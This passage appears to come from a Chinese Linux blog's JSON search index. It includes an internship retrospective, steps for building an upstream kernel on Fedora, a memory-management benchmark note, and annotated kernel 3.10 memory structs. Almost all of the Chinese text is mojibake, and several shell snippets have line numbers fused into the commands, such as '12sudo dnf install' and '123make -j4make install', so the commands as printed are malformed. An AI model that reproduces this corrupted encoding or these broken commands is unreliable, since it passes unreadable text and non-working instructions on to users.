æ€»æ˜¯é—®æˆ‘åƒä¸åƒé›¶é£Ÿï¼Œæˆ‘æ€»æ˜¯è¯´åƒï¼Œå˜¿å˜¿ï¼ŒåŠå…¬å®¤çš„é›¶é£Ÿå› ä¸ºæˆ‘åˆ°æ¥ä¸æ—¥ä¿±å‡ã€‚è¢«å°å§å§æ‰“è¶£åˆ°å®Œå…¨ä¸åŒäºå¦ä¸€ä¸ªè…¼è…†çš„å®ä¹ ç”Ÿï¼Œé—®ä»€ä¹ˆéƒ½ä¸åƒã€‚å› ä¸ºæˆ‘ä¹‹å‰æ²¡æœ‰å°è¿‡è¿™äº›é›¶é£Ÿï¼Œè¿™ä¸€æ³¢åƒåˆ°å¥½å¤šå¥½åƒçš„ã€‚ åŠå…¬å®¤æ‹æ‘„ ç†Ÿæ‚‰é¡¹ç›®çš„æ—¶é—´è¿‡çš„å¾ˆå¿«ï¼ŒåŒ—äº¬è¿˜æ˜¯å¾ˆå†·ã€‚å‘¨å››é‚£å¤©æ™šä¸Šå¯èƒ½å°±æ˜¯ 2017 å¹´æœ€å†·çš„ä¸€å¤©äº†ï¼Œè€æ¿çº¦ä¸Šå’Œæˆ‘ä¸€èµ·å®ä¹ åœ¨åŒ—äº¬è¿œç¨‹åŠå…¬çš„å°ä¼™ä¼´åƒäº†ä¸ªé¥­ï¼ŒèŠäº†èŠå¤©ï¼Œè¿™æ ·å…¬å¸ base åŒ—äº¬çš„äººéƒ½è§è¿‡ä¸€é¢äº†ã€‚ åæ¥å»è§äº†ä¸¤ä¸ªå¸ˆå…„ï¼Œé€›äº†å—é”£é¼“å··ï¼Œåƒäº†ä¸ªé“œç‚‰ï¼Œå¹äº†ä¼šç‰› bï¼Œè°ˆäº†è°ˆäººç”Ÿï¼ŒèŠäº†èŠèŒä¸šè§„åˆ’ã€‚ ç¦ 1.20 å·æ™šä¸Šå»æ‰¾ä¹‹å‰ä¸€èµ·åœ¨ä¸Šæµ·å®ä¹ çš„æœ‹å‹ï¼Œå¹¶å’Œå¦ä¸€ä¸ªèŠè‹£ä¸€èµ·åƒäº†ä¸ªæ™šé¥­ï¼Œç¬¬äºŒå¤©å’Œæœ‹å‹å»å‚åŠ å†¬æ—¥ç¥­ã€‚ æ¼«å±• 1.21 å·æ—©ä¸Šå°±åˆ°å—äº¬è½¬è½¦å‡†å¤‡å›å®¶è¿‡å¹´äº†ã€‚ 0x01 åœ¨å­¦æ ¡å·¥ä½œæ­£å¼åŠå…¬å¼€å§‹äºå…ƒå®µèŠ‚åï¼Œç¬¬ä¸€æœˆåˆšåˆšæ¥åˆ°ä»»åŠ¡è¿˜æ˜¯è›®æœ‰å‹åŠ›çš„ï¼Œä¸»è¦æ˜¯è§£å†³ intel æ˜¾å¡åœ¨ pc é¢å¸ƒ release è¿‡ç¨‹ä¸­çš„ä¸€äº›è¯¡å¼‚æƒ…å†µï¼Œè¿™ä¸ª case ä¸»è¦é æŠ±å¤§è…¿å’Œå¤šå°è¯•è§£å†³çš„ï¼›åé¢å‡ ä¸ªæœˆå› ä¸ºæŒæ¡äº†å·¥ä½œæ–¹æ³•å¹¶ä¸æ„Ÿè§‰å‹åŠ›å¤§ã€‚ è°ˆä¸€ä¸‹æˆ‘çš„ mentorï¼Œä¸€ä¸ªéå¸¸ nice çš„å°åº¦äººï¼Œä¸»è¦é€šè¿‡è‹±è¯­æ–‡æœ¬åœ¨ slack ä¸Šæ²Ÿé€šå·¥ä½œé—®é¢˜ï¼Œå¶å°”è¿˜ä¼šè¢«å®‰åˆ©ä¸€æ³¢å°åº¦ç”µå½±ï¼Œä¸è¿‡å› ä¸ºæ—¶å·®å’Œè¯­è¨€å·®å¼‚ç›´æ¥æ²Ÿé€šæœ‰æ—¶æ²Ÿé€šå¹¶ä¸æ˜¯ç‰¹åˆ«é¡ºåˆ©ã€‚è¿˜è®°å¾— kernel é…ç½®çš„é—®é¢˜ï¼Œè¿˜è¢«æ€¼äº†ä¸€ä¸‹ï¼ŒğŸ˜ï¼Œç°åœ¨æƒ³ä¸€æƒ³æ„Ÿè§‰è‡ªå·±è¿˜æ˜¯ too naiveï¼Œ åœ¨è°ˆä¸€ä¸‹åœ¨è¿œç¨‹åŠå…¬çš„æ„Ÿå—ï¼Œåœ¨å­¦æ ¡åŠå…¬çš„ä½“éªŒçœŸçš„è¶…çº§æ£’ï¼Œå·¥ä½œç¯å¢ƒå¥½ï¼Œå›¾ä¹¦é¦†ä¸€æ¥¼çš„é›…åº§æœ‰èŒ¶æ°´ä¾›åº”æœ‰é’¢ç´å¬ï¼Œç´¯äº†æˆ–è€…ä»»åŠ¡å®Œæˆåå¯ä»¥éª‘è½¦è½¬å­¦æ ¡ï¼Œæ—¢å¯ä»¥äº«å—å­¦æ ¡çš„ç†Ÿæ‚‰å’Œä¾¿åˆ©çš„ç¯å¢ƒï¼Œè¿˜èƒ½å‘¨æœ«å’ŒåŒå­¦ç©ï¼Œè¿™æ˜¯å¥½æ€€æ‹å•Šã€‚ 0x02 ç¦»èŒåˆåŒå†™åˆ° 5.30 ç¦»èŒï¼Œå…¶å®åˆ° 6 æœˆ 15 æ‰ç¦»èŒï¼Œå› ä¸ºæ¯•ä¸šè®¾è®¡çš„è€½è¯¯å’Œæ–°çš„ release çš„å‘å¸ƒï¼Œæˆ‘å»¶é•¿è·¯æˆ‘çš„å·¥ä½œæ—¥æœŸã€‚åœ¨äº§å“çš„ bbs é‡Œé¢çœ‹åˆ°ç”¨æˆ·çš„åé¦ˆï¼Œå¯¹äº§å“çš„æƒ³è±¡ï¼Œæœ‰ç§æ»¡è¶³æ„Ÿã€‚ åœ¨ç¦»èŒå‰æ²¡å‡ å¤©è¿˜æ˜¯æ”¶åˆ°äº†æŒ½ç•™ï¼Œä¸è¿‡å› ä¸ºä¸€äº›åŸå› ç»ˆç©¶æ˜¯ç¦»å¼€çš„ï¼Œè‡ªæ­¤æ•´ä¸ªå­¦ç”Ÿæ—¶ä»£çš„å®ä¹ ç”Ÿæ¶¯ç»“æŸäº†ã€‚o~ æˆ‘é€å»çš„é’æ˜¥ å“ˆå“ˆå“ˆ åœ¨æœ€åè¿˜æ˜¯è›®æ„Ÿè°¢è€æ¿èƒ½è®©æˆ‘ä½“éªŒä¸€ä¸‹å¤šæ–‡åŒ–è·¨æ—¶åŒºçš„è¿œç¨‹å®ä¹ ï¼Œè®©æˆ‘æœ‰äº†æ®µè½»æ¾ç¾å¥½çš„å›å¿†ã€‚","tags":["life"]},{"title":"how to custom kernel on fedora","path":"/2017/04/10/custom-kernel-on-fedora/","content":"å› ä¸ºå·¥ä½œéœ€è¦éœ€è¦æŠ˜è…¾ä¸€ä¸‹ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå¤‡å¿˜ä¸€ä¸‹å¦‚ä½•åœ¨ fedora 26 ä¸Šæµ‹è¯• upstream çš„ä»£ç ã€‚ 12sudo dnf install fedpkg fedora-packager rpmdevtools ncurses-devel pesign elfutils-libelf-devel git clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git è¿›å…¥ Linux æºç ç›®å½•ï¼Œæ¡å‡ºéœ€è¦çš„ç‰ˆæœ¬å¯¹åº”çš„ tagï¼Œç„¶åå‡†å¤‡ä¸€ä¸ª kernel çš„ç¼–è¯‘é…ç½®æ–‡ä»¶ã€‚ 123cd linuxgit checkout v4.11.0-rc8cp /boot/config-4.11.9-300.fc26.x86_64 .config ç¼–è¯‘-j çš„é€‰é¡¹æ˜¯å¤šä¸ªç¼–è¯‘è¿›ç¨‹åŒæ—¶å·¥ä½œï¼Œå–å†³äºä½ çš„ core æ•°é‡ã€‚å®Œæˆè¿‡åå®‰è£…å‹ç¼© kernel imageï¼Œç„¶åå®‰è£… kernel moduleã€‚ 123make -j4make installmake modules_install åˆ©ç”¨ dracut ç”Ÿæˆä¸€ä¸ª initramfsï¼ŒåŠ ä¸ª--forceæ„æ€æ˜¯è¯´å³ä½¿å­˜åœ¨ä¸€ä¸ªå¯ä»¥è¦†ç›–æ‰ã€‚æœ€åæ›´æ–°ä¸€ä¸‹ grub2 çš„é…ç½®æ–‡ä»¶ã€‚ 12dracut &quot;&quot; `make kernelrelease` --forcegrub2-mkconfig -o /boot/grub2/grub.cfg","tags":["tips"]},{"title":"linux MM performance test","path":"/2016/12/03/linux-MM-performance-test/","content":"ä¹‹å‰å­¦ä¹ å†…å­˜ç®¡ç†çš„æ¢é¡µç®—æ³•ä¸ workload ç±»å‹ä¹‹é—´å…³ç³»ï¼Œå…¶ä¸­çš„æ€§èƒ½æµ‹è¯•ä½¿ç”¨äº†vm-scalabilityé¡¹ç›®ï¼Œé¡¹ç›®çš„ maintainer éå¸¸è€å¿ƒè§£ç­”æˆ‘å…³äºé¡¹ç›®ä½¿ç”¨çš„é—®é¢˜ã€‚ çœ‹é¡¹ç›®çš„åå­—éå¸¸å®¹æ˜“ç†è§£è¿™ä¸ªé¡¹ç›®æ˜¯ä¸ºäº†è§£å†³æµ‹è¯•å†…å­˜ç®¡ç†å­ç³»ç»Ÿçš„æ‹“å±•æ€§é—®é¢˜çš„ï¼Œä¹‹å‰æˆ‘åªæ˜¯å…³æ³¨äº†æ¢é¡µç®—æ³• LRU å®ç°ï¼š 1234567-rwxr-xr-x\tcase-lru-file-mmap-read\t366\tlogstatsplain-rwxr-xr-x\tcase-lru-file-mmap-read-rand\t375\tlogstatsplain-rwxr-xr-x\tcase-lru-file-readonce\t555\tlogstatsplain-rwxr-xr-x\tcase-lru-file-readtwice\t863\tlogstatsplain-rwxr-xr-x\tcase-lru-memcg\t694\tlogstatsplain-rwxr-xr-x\tcase-lru-shm\t539\tlogstatsplain-rwxr-xr-x\tcase-lru-shm-rand\t348\tlogstatsplain ç”¨å®ƒæµ‹è¯•äº†mm: vmscan: move dirty pages out of the way until theyâ€™re flushedè¿™ä¸ª patchï¼Œcase-lru-file-readonceåœ¨ 64 G å†…å­˜æœºå™¨ä¸‹é¢æç¤ºå¤§çº¦ 3%ï¼Œè€Œ 32G ä¸‹é¢æå‡éå¸¸æœ‰é™äº†ã€‚ æœç´¢äº†ä¸€ä¸‹ mm é‚®ä»¶åˆ—è¡¨å¯ä»¥çœ‹åˆ°æœ‰ kernel å¼€å‘è€…æ‹¿è¿™ä¸ªåšæ€§èƒ½å›å½’æµ‹è¯•çš„ä¸€ä¸ªå¦ä¸€ä¸ªä¾‹å­[^regression]ã€‚ [^regression]: mm: fix vm-scalability regression in cgroup-aware workingset code","tags":["linux"]},{"title":"the data struct of slab","path":"/2016/11/19/the-data-struct-of-slab/","content":"slab åˆ†é…å™¨æ˜¯ kernel ä¸»è¦ç”¨æ¥è§£å†³å†…å­˜å†…ç¢ç‰‡é—®é¢˜ï¼Œè¿˜æœ‰å…¶å®ƒçš„ä¼˜åŠ¿æ¯”å¦‚åŠ é€Ÿåˆ†é…å’Œå¼•å…¥è€åŒ–æœºåˆ¶ï¼Œæœ€åˆçš„è®¾è®¡åº”è¯¥æ˜¯å€Ÿé‰´äº† Solaris 2.4ã€‚linux å†…éƒ¨çš„ slab æœ€åˆçš„å®ç°éå¸¸ç²¾å·§ä¸”éå¸¸éå¸¸ä¹…è¿œã€‚ ç”¨æˆ·æ€è§‚å¯Ÿ (å‡†ç¡®çš„è®²è¿™ä¸ªæ–‡ä»¶è¾“å‡ºçš„å†…å®¹æ˜¯åœ¨ sulb.c é‡Œé¢å®ç°çš„ï¼Œä¸ç®—æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ slab) 123456789cat /proc/slabinfoslabinfo - version: 2.1# name &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;nf_conntrack_expect 0 0 224 36 2 : tunables 0 0 0 : slabdata 0 0 0nf_conntrack 204 204 320 51 4 : tunables 0 0 0 : slabdata 4 4 0rpc_inode_cache 51 51 640 51 8 : tunables 0 0 0 : slabdata 1 1 0xfs_dqtrx 0 0 528 62 8 : tunables 0 0 0 : slabdata 0 0 0xfs_dquot 0 0 472 69 8 : tunables 0 0 0 : slabdata 0 0 0... è®¾è®¡ç¤ºæ„å›¾å¦‚ä¸‹ï¼š æ¯ç§ cache é‡Œé¢åŒ…å«ä¸åŒç±»å‹çš„å¯¹è±¡çš„é›†åˆï¼Œcache ç”¨ slab ç»„ç»‡è¿™äº›å¯¹è±¡ï¼Œslab åœ¨ç‰©ç†é¡µé¢ä¸Šè¿ç»­ï¼Œæ¯ä¸ª slab åŒ…å«å¤šä¸ªå¯¹è±¡ï¼Œæ¯ä¸ª slab æ ¹æ®é‡Œé¢ç©ºé—²å¯¹è±¡çš„æ•°é‡æ¥åˆ†ç±»å½’å±äº fullï¼Œemptyï¼Œpartial ä¸­çš„ä¸€ç§ã€‚ åœ¨ Linux 3.10 ä¸­ cache ç”¨ kmem_cache ç»“æ„ä½“æ¥å®ç°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct kmem_cache &#123;// å¯è¢«è°ƒæ•´ç¼“å­˜çš„å‚æ•°ï¼Œç”± cache_chain_mutex é”ä¿æŠ¤\tunsigned int batchcount;\tunsigned int limit; // æŒ‡å®šäº† per-CPU åˆ—è¡¨ä¸­ä¿å­˜çš„å¯¹è±¡ä¸Šé™ã€‚å¦‚æœè¶…å‡ºï¼Œå†…æ ¸ä¼šå°† batchcount ä¸ªå¯¹è±¡è¿”å›åˆ° slab\tunsigned int shared;\tunsigned int size; // æŒ‡å®šç¼“å­˜ç®¡ç†åŒºå¯¹è±¡çš„é•¿åº¦\tu32 reciprocal_buffer_size; // åœ¨æ¯æ¬¡åˆ†é…å’Œé‡Šæ”¾æ—¶è®¿é—®\tunsigned int flags; /* constant flags */\tunsigned int num; /* # of objs per slab */// cache çš„ä¼¸ç¼©\t/* order of pgs per slab (2^n) */\tunsigned int gfporder;\t/* force GFP flags, e.g. GFP_DMA */\tgfp_t allocflags;\tsize_t colour; /* cache ç€è‰²çš„èŒƒå›´ */\tunsigned int colour_off;\t/* colour ç€è‰²çš„ offset */\tstruct kmem_cache *slabp_cache;\tunsigned int slab_size;\t/* æ„é€ å‡½æ•° func */\tvoid (*ctor)(void *obj);// cache çš„æ„é€ æˆ–ç§»é™¤ const char *name; // cache çš„åå­—\tstruct list_head list;\tint refcount;\tint object_size;\tint align;// debug å’Œç»Ÿè®¡ä¿¡æ¯ä¸å…³æ³¨// æ¯ cpu æ¯ å†…å­˜èŠ‚ç‚¹çš„æ•°æ®\t/* * We put array[] at the end of kmem_cache, because we want to size * this array to nr_cpu_ids slots instead of NR_CPUS * (see kmem_cache_init()) * We still use [NR_CPUS] and not [1] or [0] because cache_cache * is statically defined, so we reserve the max number of cpus. * * We also need to guarantee that the list is able to accomodate a * pointer for each node since &quot;nodelists&quot; uses the remainder of * available pointers. */\tstruct kmem_cache_node **node; // ULK3 é‡Œé¢çš„ kmem_list3 ç»“æ„ä½“\tstruct array_cache *array[NR_CPUS + MAX_NUMNODES]; // æ•°ç»„æŒ‡é’ˆï¼Œæ¯ä¸€é¡¹å¯¹åº” cpu æˆ– numa èŠ‚ç‚¹&#125;; kmem_cache_node å°±æ˜¯ ULKe3 ä¸­ kmem_list3 æ¼”åŒ–è¿‡æ¥çš„ï¼Œ 123456789101112131415161718192021222324/* * The slab lists for all objects. */struct kmem_cache_node &#123;\tspinlock_t list_lock;#ifdef CONFIG_SLAB// slab çš„ä¸‰ç§åˆ†ç±»ï¼Œpartialï¼Œfullï¼Œfree ç»„ç»‡é“¾è¡¨// partial é“¾è¡¨æ”¾åœ¨ç¬¬ä¸€ä¸ªæ€§èƒ½æ›´å¥½ä¸€ç‚¹\tstruct list_head slabs_partial;\tstruct list_head slabs_full;\tstruct list_head slabs_free;\tunsigned long free_objects; // æ‰€æœ‰æœªä½¿ç”¨çš„å¯¹è±¡\tunsigned int free_limit; // æŒ‡å®šäº†æ‰€æœ‰ slab ä¸Šå®¹è®¸æœªä½¿ç”¨å¯¹è±¡çš„æœ€å¤§æ•°ç›®\tunsigned int colour_next;\t// æ¯èŠ‚ç‚¹çš„ç€è‰²\tstruct array_cache *shared;\t// æŒ‡å‘æ‰€æœ‰ cpu å…±äº«çš„æœ¬åœ° cache\tstruct array_cache **alien;\t// on other nodes\tunsigned long next_reap;\t// ç”¨äºé¡µæ¡†å›æ”¶\tint free_touched; // ç”¨äº slab åˆ†é…å™¨çš„é¡µæ¡†å›æ”¶#endif// ç§»é™¤äº†éƒ¨åˆ†ä¸å…³æ³¨çš„ä¿¡æ¯...&#125;; ä¸åŒäº Solaris 2.4 å®ç°ï¼ŒLinux è‡ªå¼•å…¥ slab å°±æ˜¯è¦è€ƒè™‘å¤šå¤„ç†å™¨æƒ…å†µï¼Œè€Œ array_cache ç»“æ„ä½“çš„ç›®çš„æ­£æ˜¯ä¼˜åŒ–å¤šå¤„ç†ä¸‹ä¸€äº›æ€§èƒ½é—®é¢˜ï¼Œæ›´å¥½çš„åˆ©ç”¨ cpu çš„é«˜é€Ÿç¼“å­˜ã€‚åœ¨åˆ†é…å’Œé‡Šæ”¾å¯¹è±¡æ—¶å€™ï¼Œä»¥ LIFO åºä» _alloc åˆ†å‘ç¼“å­˜è¿‡çƒ­çš„å¯¹è±¡ã€‚å‡å°‘é“¾è¡¨çš„æ“ä½œã€‚å‡å°‘è‡ªæ—‹é”çš„æ“ä½œã€‚ æ¯ä¸€ä¸ª array_cache ç»“æ„ä½“æè¿°ä¸€ä¸ªæœ¬åœ° cache çš„ä¸­ free å¯¹è±¡ã€‚ 12345678910111213141516struct array_cache &#123;\tunsigned int avail; // available æŒ‡å‘å½“å‰å¯ç”¨å¯¹è±¡æŒ‡é’ˆçš„æ•°é‡\tunsigned int limit; // ç¼“å­˜åœ¨æ”¶ç¼©ä¹‹åç©ºé—²å¯¹è±¡æ•°é‡ä¸Šé™\tunsigned int batchcount; // åœ¨ per-CPU åˆ—è¡¨ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œä» cache çš„ slab ä¸­è·å–å¯¹è±¡çš„æ•°ç›®\tunsigned int touched; // ä» cache ç§»é™¤æ—¶ touched ä¸º 1ï¼Œcache æ”¶ç¼©æ—¶åˆ™ 0.\tspinlock_t lock;\tvoid *entry[]; /* ä¸‹é¢æ³¨é‡Šå†™çš„è›®æ¸…æ¥šçš„ * Must have this definition in here for the proper * alignment of array_cache. Also simplifies accessing * the entries. * * Entries should not be directly dereferenced as * entries belonging to slabs marked pfmemalloc will * have the lower bits set SLAB_OBJ_PFMEMALLOC */&#125;; slab ç»“æ„ä½“ç”¨æ¥ç»„ç»‡å¯¹è±¡ï¼Œå®ƒæ€»æ˜¯è¢«ä¸²åœ¨ä¸‰ä¸­ä¹‹å‰æ‰€è¿°çš„é“¾è¡¨ä¸­çš„ä¸€ä¸ªä¸­ (partial, full, free)ã€‚slab æè¿°ç¬¦å¯èƒ½ä¼šè¢«å­˜æ”¾åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼šå­˜æ”¾åœ¨ slab å¤–éƒ¨ï¼Œä½äº cache_size æŒ‡å‘çš„ä¸€ä¸ªæ™®é€šé«˜é€Ÿç¼“å­˜ä¸­ï¼›å­˜æ”¾åœ¨ slab çš„å†…éƒ¨ï¼Œä½äºåˆ†é…ç»™ slab çš„å†…å­˜çš„ç¬¬ä¸€ä¸ªé¡µæ¡†çš„èµ·å§‹ä½ç½®ã€‚ 12345678910111213struct slab &#123; union &#123; struct &#123; struct list_head list; unsigned long colouroff; // ç¬¬ä¸€ä¸ª obj çš„ç€è‰² offset void *s_mem; // ç¬¬ä¸€ä¸ª obj çš„åœ°å€åŒ…å«ç€è‰² offset unsigned int inuse; // å½“å‰è¢«ç”¨çš„ obj çš„æ•°é‡ kmem_bufctl_t free; unsigned short nodeid; &#125;; struct slab_rcu __slab_cover_slab_rcu; &#125;;&#125;;","tags":["linux"]},{"title":"the virtual address of process","path":"/2016/11/17/virtual-memory-of-process/","content":"ä¹‹å‰è¯» ULKe3 å¹¶æ²¡æœ‰é…åˆæœ€è¿‘ç‰ˆæœ¬çš„æºç ä¸€èµ·é£Ÿç”¨ï¼Œå¯¼è‡´ç†è§£ä¸å¤Ÿæ·±åˆ»ã€‚åæ¥åˆè¯»äº†ä¸€é Linux kernel developmentï¼Œæ„Ÿè§‰è™½ç„¶æˆæ–‡å†…å®¹æœ‰ç‚¹è€ï¼Œä½†æ˜¯ç»“æ„éå¸¸æ¸…æ™°ï¼Œä½†æ˜¯ç»†èŠ‚å°‘ã€‚äºæ˜¯å‡­å€Ÿç€å¯¹ Linux kernel development çš„ç†è§£åˆæ‹¿å» ULK å’Œ kernel 3.10 è¯»äº†ä¸€éï¼Œæ•´ç†å¦‚ä¸‹ã€‚ kernel task_struct ä¸­ struct mm_struct *mm, *active_mm æ˜¯è®°å½•æ˜ å°„ç”¨æˆ·æ€åœ°å€ç©ºé—´çš„ï¼Œç»“æ„ä½“é‡Œé¢ç§»é™¤äº†ä¸€éƒ¨åˆ†å…³äº numa çš„å­—æ®µï¼Œè™½ç„¶ numa æ˜¯ç°ä»£è®¡ç®—æœºéå¸¸é‡è¦çš„éƒ¨åˆ†ï¼Œä½†æ˜¯å¼•å…¥äº†å¤ªå¤šé¢å¤–çš„ç»†èŠ‚å¯¹æ ¸å¿ƒçš„ç†è§£æœ‰ç‚¹å¹²æ‰°ï¼Œè¿˜æ˜¯ç§»é™¤äº†ç®€å•ä¸€ç‚¹ï¼Œæœ‰æœºä¼šå•ç‹¬æ¢³ç†ä¸€ä¸‹ numa å§ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192struct mm_struct &#123;\tstruct vm_area_struct * mmap; // æŒ‡å‘å†…å­˜åŒºåŸŸé“¾è¡¨å¤´éƒ¨çš„æŒ‡é’ˆ\tstruct rb_root mm_rb; // æŒ‡å‘å†…å­˜åŒºåŸŸå¯¹è±¡ç»„ç»‡çš„çº¢é»‘æ ‘çš„æ ¹èŠ‚ç‚¹\tstruct vm_area_struct * mmap_cache;\t// æŒ‡å‘æœ€åä¸€ä¸ªå†…å­˜åŒºåŸŸå¯¹è±¡#ifdef CONFIG_MMU\tunsigned long (*get_unmapped_area) (struct file *filp, unsigned long addr, unsigned long len, unsigned long pgoff, unsigned long flags);\tvoid (*unmap_area) (struct mm_struct *mm, unsigned long addr);#endif\tunsigned long mmap_base; // unsigned long task_size; /* size of task vm space */\tunsigned long cached_hole_size; /* if non-zero, the largest hole below free_area_cache */\tunsigned long free_area_cache; /* first hole of size cached_hole_size or larger */\tunsigned long highest_vm_end; /* highest vma end address */\tpgd_t * pgd;\tatomic_t mm_users; /* How many users with user space? */\tatomic_t mm_count; /* How many references to &quot;struct mm_struct&quot; (users count as 1) */\tint map_count; /* number of VMAs */\tspinlock_t page_table_lock; /* Protects page tables and some counters */\tstruct rw_semaphore mmap_sem;\tstruct list_head mmlist; /* List of maybe swapped mm&#x27;s.\tThese are globally strung * together off init_mm.mmlist, and are protected * by mmlist_lock */\tunsigned long hiwater_rss;\t/* High-watermark of RSS usage */\tunsigned long hiwater_vm;\t/* High-water virtual memory usage */\tunsigned long total_vm; /* Total pages mapped */\tunsigned long locked_vm;\t/* Pages that have PG_mlocked set */\tunsigned long pinned_vm;\t/* Refcount permanently increased */\tunsigned long shared_vm;\t/* Shared pages (files) */\tunsigned long exec_vm; /* VM_EXEC &amp; ~VM_WRITE */\tunsigned long stack_vm; /* VM_GROWSUP/DOWN */\tunsigned long def_flags;\tunsigned long nr_ptes; /* Page table pages */\tunsigned long start_code, end_code, start_data, end_data;\tunsigned long start_brk, brk, start_stack;\tunsigned long arg_start, arg_end, env_start, env_end;\tunsigned long saved_auxv[AT_VECTOR_SIZE]; /* for /proc/PID/auxv */\t/* * Special counters, in some configurations protected by the * page_table_lock, in other configurations by being atomic. */\tstruct mm_rss_stat rss_stat;\tstruct linux_binfmt *binfmt;\tcpumask_var_t cpu_vm_mask_var;\t/* Architecture-specific MM context */\tmm_context_t context;\tunsigned long flags; /* Must use atomic bitops to access the bits */\tstruct core_state *core_state; /* coredumping support */#ifdef CONFIG_AIO\tspinlock_t ioctx_lock;\tstruct hlist_head\tioctx_list;#endif#ifdef CONFIG_MM_OWNER\t/* * &quot;owner&quot; points to a task that is regarded as the canonical * user/owner of this mm. All of the following must be true in * order for it to be changed: * * current == mm-&gt;owner * current-&gt;mm != mm * new_owner-&gt;mm == mm * new_owner-&gt;alloc_lock is held */\tstruct task_struct __rcu *owner;#endif\t/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */\tstruct file *exe_file;...#ifdef CONFIG_TRANSPARENT_HUGEPAGE\tpgtable_t pmd_huge_pte; /* protected by page_table_lock */#endif#ifdef CONFIG_CPUMASK_OFFSTACK\tstruct cpumask cpumask_allocation;#endif...\tstruct uprobes_state uprobes_state;&#125;; This struct defines a memory VMM memory area. There is one of these per VM-area&#x2F;task. A VM area is any part of the process virtual memory space that has a special rule for the page-fault handlers (ie a shared library, the executable area etc). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162struct vm_area_struct &#123;\t/* The first cache line has the info for VMA tree walking. */\tunsigned long vm_start; /* Our start address within vm_mm. */\tunsigned long vm_end; /* The first byte after our end address within vm_mm. */\t/* linked list of VM areas per task, sorted by address */\tstruct vm_area_struct *vm_next, *vm_prev;\tstruct rb_node vm_rb;\t/* * Largest free memory gap in bytes to the left of this VMA. * Either between this VMA and vma-&gt;vm_prev, or between one of the * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps * get_unmapped_area find a free area of the right size. */\tunsigned long rb_subtree_gap;\t/* Second cache line starts here. */\tstruct mm_struct *vm_mm;\t/* The address space we belong to. */\tpgprot_t vm_page_prot; /* Access permissions of this VMA. */\tunsigned long vm_flags; /* Flags, see mm.h. */\t/* * For areas with an address space and backing store, * linkage into the address_space-&gt;i_mmap interval tree, or * linkage of vma in the address_space-&gt;i_mmap_nonlinear list. */\tunion &#123; struct &#123; struct rb_node rb; unsigned long rb_subtree_last; &#125; linear; struct list_head nonlinear;\t&#125; shared;\t/* * A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma * list, after a COW of one of the file pages.\tA MAP_SHARED vma * can only be in the i_mmap tree. An anonymous MAP_PRIVATE, stack * or brk vma (with NULL file) can only be in an anon_vma list. */\tstruct list_head anon_vma_chain; /* Serialized by mmap_sem &amp; * page_table_lock */\tstruct anon_vma *anon_vma;\t/* Serialized by page_table_lock */\t/* Function pointers to deal with this struct. */\tconst struct vm_operations_struct *vm_ops;\t/* Information about our backing store: */\tunsigned long vm_pgoff; /* Offset (within vm_file) in PAGE_SIZE units, *not* PAGE_CACHE_SIZE */\tstruct file * vm_file; /* File we map to (can be NULL). */\tvoid * vm_private_data; /* was vm_pte (shared mem) */#ifndef CONFIG_MMU\tstruct vm_region *vm_region;\t/* NOMMU mapping region */#endif&#125;; These are the virtual MM functions - opening of an area, closing and unmapping it (needed to keep files on disk up-to-date etc), pointer to the functions called when a no-page or a wp-page exception occurs. 12345678910111213141516171819struct vm_operations_struct &#123;\tvoid (*open)(struct vm_area_struct * area);\tvoid (*close)(struct vm_area_struct * area);\tint (*fault)(struct vm_area_struct *vma, struct vm_fault *vmf);\t/* notification that a previously read-only page is about to become * writable, if an error is returned it will cause a SIGBUS */\tint (*page_mkwrite)(struct vm_area_struct *vma, struct vm_fault *vmf);\t/* called by access_process_vm when get_user_pages() fails, typically * for use by special VMAs that can switch between memory and hardware */\tint (*access)(struct vm_area_struct *vma, unsigned long addr, void *buf, int len, int write);...\t/* called by sys_remap_file_pages() to populate non-linear mapping */\tint (*remap_pages)(struct vm_area_struct *vma, unsigned long addr, unsigned long size, pgoff_t pgoff);&#125;;","tags":["linux"]},{"title":"the organization of linux physical memory","path":"/2016/11/15/the-organization-of-kernel-physical-memory/","content":"æ¢³ç†ä¸€ä¸‹ Linux ç‰©ç†å†…å­˜çš„ç»„ç»‡ï¼Œæœ‰äº†è¿™ä¸ªé“ºå«å¯ä»¥å¿«é€Ÿä»€ä¹ˆé¡µæ¡†å›æ”¶ï¼ŒKSM(kernel samepage merging)ï¼Œcgroup mm æ˜¯åœ¨å†…å­˜é‚£ä¸ªå±‚é¢ç©çš„ï¼Œèƒ½ç©å‡ºä»€ä¹ˆèŠ±æ ·ï¼Œè¿˜èƒ½ç©å‡ºä»€ä¹ˆèŠ±æ ·ã€‚ ç°ä»£çš„ Linux éƒ½æ˜¯æ”¯æŒ NUMAï¼Œå®ƒå’Œæ™®é€šçš„ SMP æœºå™¨åŒºåˆ«åœ¨äºåŒä¸€ä¸ª cpu è®¿é—®ä¸åŒçš„åœ°å€çš„æ—¶é—´å¼€é”€å¯èƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å«ä¸ä¸€è‡´ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* * The pg_data_t structure is used in machines with CONFIG_DISCONTIGMEM * (mostly NUMA machines?) to denote a higher-level memory zone than the * zone denotes. * * On NUMA machines, each NUMA node would have a pg_data_t to describe * it&#x27;s memory layout. * * Memory statistics and page replacement data structures are maintained on a * per-zone basis. */struct bootmem_data;typedef struct pglist_data &#123; struct zone node_zones[MAX_NR_ZONES]; struct zonelist node_zonelists[MAX_ZONELISTS]; int nr_zones;#ifdef CONFIG_FLAT_NODE_MEM_MAP /* means !SPARSEMEM */ struct page *node_mem_map;#ifdef CONFIG_MEMCG struct page_cgroup 